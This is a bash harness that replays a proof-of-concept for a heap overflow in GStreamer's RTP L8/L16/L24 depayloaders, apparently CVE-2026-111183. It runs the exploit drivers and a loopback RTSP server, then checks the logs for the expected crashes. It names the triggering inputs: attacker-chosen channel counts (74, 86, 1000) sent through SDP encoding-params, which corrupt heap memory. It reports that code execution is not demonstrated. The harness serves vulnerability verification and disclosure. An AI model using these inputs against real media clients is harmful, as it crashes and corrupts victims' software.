#!/usr/bin/env bash
# One-command witness replay for the gst2shell (CVE-2026-111183) claim.
#
# Re-runs every driver from the pinned/committed sources, writes each driver's
# output to verify-out/<tag>.log, and asserts the observable claims. All RTSP
# traffic stays on 127.0.0.1; no external probe, no credentials.
#
# Usage:  bash lab/gst2shell-src/verify_all.sh
#         VERIFY_VALGRIND=1 bash lab/gst2shell-src/verify_all.sh   # + ~120 s memcheck
# Exit 0 iff every assertion passes.
set -u
cd "$(dirname "$0")" || exit 2

OUT="verify-out/$(date -u +%Y%m%dT%H%M%SZ)"
mkdir -p "$OUT" || exit 2
pass=0
fail=0

echo "gst2shell witness replay $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "git HEAD: $(git rev-parse --short HEAD 2>/dev/null || echo unknown)"
echo "output:   $OUT"
echo

say() { printf '%s\n' "$*"; }

# check <tag> <name> <ERE>  — assertion against verify-out/<tag>.log
check() {
  local tag=$1 name=$2 pat=$3 f="$OUT/$1.log"
  if [ -f "$f" ] && grep -qE "$pat" "$f"; then
    say "PASS  $name"
    pass=$((pass+1))
  else
    say "FAIL  $name  [/$pat/ in $f]"
    fail=$((fail+1))
  fi
}

# run <tag> <script> [args...] — capture stdout+stderr to verify-out/<tag>.log
run() {
  local tag=$1; shift
  say "===== running $* ====="
  bash "$@" >"$OUT/$tag.log" 2>&1
  say "      rc=$?"
}

# checkfile <name> <file> <ERE> — binary-safe assertion on a raw log
checkfile() {
  local name=$1 f=$2 pat=$3
  if [ -f "$f" ] && grep -aqE "$pat" "$f"; then
    say "PASS  $name"
    pass=$((pass+1))
  else
    say "FAIL  $name  [/$pat/ in $f]"
    fail=$((fail+1))
  fi
}

# checkfault <codec> — the N=1000 leg must fault the victim. glibc's abort text
# varies by host and build (SIGSEGV, malloc/free/realloc errors,
# malloc_consolidate, "dumped core"), so accept the observed fault-signature
# family OR a nonzero gst-launch rc recorded by the family driver. The benign
# N=8 leg must stay rc=0, so a nonzero rc is a genuine victim-fault signal.
checkfault() {
  local codec=$1 log="family_${codec}_1000.log" rcfile="family_rc_${codec}_1000.txt"
  local pat='Caught SIGSEGV|SIGABRT|Aborted|Segmentation fault|dumped core|malloc\(\):|malloc_consolidate\(\):|free\(\):|realloc\(\):|double free|corrupt|invalid chunk|invalid size|unaligned tcache|gst_rtp_L[0-9]+_depay_setcaps'
  if { [ -f "$log" ] && grep -aqE "$pat" "$log"; } || \
     { [ -f "$rcfile" ] && grep -aqE '^[1-9][0-9]*$' "$rcfile"; }; then
    say "PASS  $codec N=1000 faults victim"
    pass=$((pass+1))
  else
    say "FAIL  $codec N=1000 faults victim  [no fault signature in $log and no nonzero rc in $rcfile]"
    fail=$((fail+1))
  fi
}

say "--- pinned source digests ---"
sha256sum \
  ../frontier/gst2shell/rtp_channels_overflow.c \
  ../frontier/gst2shell/run.sh \
  rtsp_server.py rtsp_server_codec.py run_rtsp.sh run_rtsp_family.sh \
  | tee "$OUT/digests.txt"
say

# ---- rungs 1-4 in the extracted harness ------------------------------------
run extracted ../frontier/gst2shell/run.sh
check extracted "rung1 write extent" \
  'rung1 channels=1000 position_capacity=64 oob_writes=936 first_oob=256 last_oob=3999'
check extracted "rung2 length control" 'rung2 verdict=LENGTH_CONTROL_OBSERVED'
check extracted "rung3 ASan heap-buffer-overflow WRITE" \
  'ERROR: AddressSanitizer: heap-buffer-overflow.*|WRITE of size 4'
check extracted "rung4 honestly NOT demonstrated" 'rung4 verdict=NOT_DEMONSTRATED'
check extracted "MIN-clamped fixed control clean" 'fixed channels=1000 oob_writes=0 verdict=PASS'
check extracted "5/5 deterministic traces" 'PASS 5/5 identical'
check extracted "harness aggregate" 'ALL CHECKS PASS'
check extracted "trace hash stable" \
  'sha256=c96ad6f616edf4765240bf0bb936ae3e30ca2c11f13b1edef70d46a16119f056'

# ---- source-faithful layout probe ------------------------------------------
run layout run.sh
check layout "layout zone counts at N=1000" \
  'oob_writes=936 pad_writes=1 reserved_writes=8 order_writes=2 escape_writes=925'
check layout "ASan WRITE past 328-byte tail" 'WRITE of size 4'
check layout "ASan heap-buffer-overflow" 'ERROR: AddressSanitizer: heap-buffer-overflow'

# ---- live GObject ASan harness ---------------------------------------------
run live run_live.sh
check live "pinned vulnerable channels.c" \
  'pinned upstream/channels.c 08ae20b33b764ce0a5f9e7e0e4d2b65cb3dc85e2b5bbee373218e817b75e577b'
check live "NONE is -3, not zero" 'GST_AUDIO_CHANNEL_POSITION_NONE = -3'
check live "create_default overflow frame" 'gst_rtp_channels_create_default upstream/channels.c:309'
check live "N=74 corrupts order to 0xfffffffd" 'setcaps_return=0 channels_field=74 order_ptr=0xfffffffd'
check live "N=74 order deref faults" 'deref_vuln_rc=1'
check live "benign N=8 order deref clean" 'deref_benign_rc=0'
check live "MIN-clamped fixed control clean" 'fixed_rc=0'

# ---- shipping plugin direct set_caps ---------------------------------------
run plugin run_real.sh
check plugin "benign N=8 clean" 'channels=8[[:space:]]+rc=0'
check plugin "N=1000 faults" 'channels=1000[[:space:]]+rc=139'
check plugin "corrupted pad g_class value" 'rax[[:space:]]+0xfffffffdfffffffd'
check plugin "N=86 heap-metadata fault" 'arena_for_chunk'

# ---- SDP parser -> caps -----------------------------------------------------
run sdp run_sdp.sh
check sdp "rtpmap maps to encoding-params=1000" 'encoding-params=\(string\)1000'
check sdp "N=86 faults" 'rc=139'
check sdp "fault symbolicated in setcaps" 'gst_rtp_L16_depay_setcaps\+480'
check sdp "benign paths reach real set_caps" 'set_caps=1'

# ---- real loopback RTSP, L16 ------------------------------------------------
run rtsp run_rtsp.sh
check rtsp "pinned L16 server" 'server_digest f812d84453ed3e6f3698ed144cd36490bfc74eea78159defba4b06d40e1e0668'
check rtsp "rtspsrc propagates encoding-params" 'encoding-params=\(string\)1000'
check rtsp "attacker count faults victim" 'Caught SIGSEGV|rc=134|rc=139'

# ---- real loopback RTSP, all three depays ----------------------------------
run family run_rtsp_family.sh
check family "pinned codec server" 'server_codec_digest 1493f137e48baa063cdf6f06ec7483da878ca2512b56220e7ed455755a3cb45c'
for codec in L8 L16 L24; do
  checkfile "$codec benign N=8 auto-plugs depay" "family_${codec}_8.log" "GstRtp${codec}Depay"
  checkfile "$codec N=1000 auto-plugs depay" "family_${codec}_1000.log" "GstRtp${codec}Depay"
  # The exact glibc abort message and rc (124/134/139) vary by host and build;
  # the stable claim is "attacker-chosen count faults the victim". checkfault
  # accepts the observed fault-signature family OR a nonzero driver rc.
  checkfault "$codec"
done
say "      observed family fault signatures (informational):"
for codec in L8 L16 L24; do
  printf '        %s: ' "$codec"
  grep -aoE 'malloc\(\): [a-z ()]+|malloc_consolidate\(\): [a-z ()]+|free\(\): [a-z ()]+|dumped core|Caught SIGSEGV' "family_${codec}_1000.log" | sort -u | tr '\n' ' '
  say
done

# ---- optional valgrind confirmation of the real remote path ----------------
if [ "${VERIFY_VALGRIND:-0}" = 1 ]; then
  say "===== valgrind memcheck, L8 N=1000 (slow) ====="
  python3 rtsp_server_codec.py 18700 1000 L8 >"$OUT/vg_server.log" 2>&1 &
  srv=$!
  sleep 0.6
  timeout 120 valgrind --tool=memcheck --error-exitcode=99 \
    --log-file="$OUT/vg_L8_1000.log" \
    gst-launch-1.0 -v uridecodebin uri=rtsp://127.0.0.1:18700/ '!' fakesink \
    >"$OUT/vg_run.log" 2>&1
  say "      valgrind wrapper rc=$?"
  kill "$srv" 2>/dev/null
  wait "$srv" 2>/dev/null
  checkfile "Invalid write of size 4" "$OUT/vg_L8_1000.log" 'Invalid write of size 4'
  checkfile "0 bytes past 1,016-byte GObject block" "$OUT/vg_L8_1000.log" '0 bytes after a block of size 1,016'
  checkfile "gst_pad_send_event frame" "$OUT/vg_L8_1000.log" 'gst_pad_send_event'
  checkfile "g_malloc0 -> g_type_create_instance allocation" "$OUT/vg_L8_1000.log" 'g_type_create_instance'
fi

say
say "TOTAL: pass=$pass fail=$fail"
if [ "$fail" -eq 0 ]; then
  say "VERDICT: ALL CLAIMS REPRODUCED (chosen-byte rung 4 still NOT demonstrated)"
  exit 0
fi
say "VERDICT: REPLAY FAILED — inspect $OUT before any claim"
exit 1
